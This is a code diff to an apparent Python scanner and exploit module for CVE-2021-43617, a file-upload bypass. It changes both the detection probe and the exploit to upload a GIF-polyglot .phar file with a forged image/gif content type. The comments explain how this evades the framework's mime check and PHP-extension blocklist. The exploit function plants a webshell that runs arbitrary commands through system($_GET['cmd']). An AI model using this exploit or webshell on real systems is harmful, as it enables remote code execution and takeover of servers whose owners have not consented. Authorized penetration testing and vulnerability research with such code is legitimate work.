@@ -106,12 +106,17 @@ def scan(target_url: str, *, session=None, username=None, password=None, **kwarg
                 "reason": _msg,
             }
 
+    # Faithful CVE-2021-43617 probe: a GIF-polyglot .phar. finfo() sees the GIF89a header
+    # as image/gif so guessExtension() == 'gif' and the framework `mimes:jpg,jpeg,png,gif`
+    # rule passes; validateMimes()->shouldBlockPhpUpload() blocks php/php3/php4/php5/phtml
+    # but NOT phar, so the executable slips through. Stored under its .phar name it runs where
+    # Debian/Apache maps .phar -> application/x-httpd-php.
     marker = "lvc43617_" + uuid.uuid4().hex
-    filename = f"{marker}.php"
-    payload_content = f"<?php echo '{marker}'; ?>".encode("ascii")
+    filename = f"{marker}.phar"
+    payload_content = b"GIF89a;\n" + f"<?php echo '{marker}'; ?>".encode("ascii")
 
     files = {
-        "file": (filename, payload_content, "application/octet-stream")
+        "file": (filename, payload_content, "image/gif")
     }
 
     best_sink = None
@@ -295,8 +300,10 @@ def exploit(target_url: str, *, username: str = None, password: str = None,
 
         # Unique webshell so re-runs don't collide and we can detect a stale hit.
         marker = uuid.uuid4().hex[:8]
-        shell_name = f"poc{marker}.php"
-        webshell = b"<?php echo 'RCE-43617-START'; system($_GET['cmd']); echo 'RCE-43617-END'; ?>"
+        # GIF-polyglot .phar: passes the framework `mimes` image rule (guessExtension=='gif')
+        # yet executes as PHP under the Debian .phar handler once stored under its name.
+        shell_name = f"poc{marker}.phar"
+        webshell = b"GIF89a;\n<?php echo 'RCE-43617-START'; system($_GET['cmd']); echo 'RCE-43617-END'; ?>"
 
         last_reason = "no upload endpoint accepted a PHP-named file"
 
@@ -305,7 +312,7 @@ def exploit(target_url: str, *, username: str = None, password: str = None,
             try:
                 up = sess.post(
                     upload_url,
-                    files={"file": (shell_name, webshell, "application/octet-stream")},
+                    files={"file": (shell_name, webshell, "image/gif")},
                     timeout=15,
                 )
             except Exception as e:
